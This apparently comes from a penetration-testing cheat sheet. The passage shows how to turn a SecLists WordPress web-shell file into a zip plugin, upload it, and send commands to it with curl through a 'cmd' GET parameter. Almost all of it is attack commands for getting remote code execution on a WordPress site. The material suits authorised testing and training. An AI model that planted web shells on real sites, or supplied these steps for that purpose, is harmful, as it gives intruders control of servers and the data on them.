## Plugin With Code Execution

We can use the seclists package in order to create a Wordpress plugin which will generate a web-shell:

```bash
#Move to directory
cd /usr/share/seclists/Web-Shells/WordPress

#Compress the PHP
sudo zip plugin-shell.zip plugin-shell.php

#Uplaod the plugin and navigate to directory. Use cmd GET parameter to inject code:
curl http://$DOMAIN/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=
```
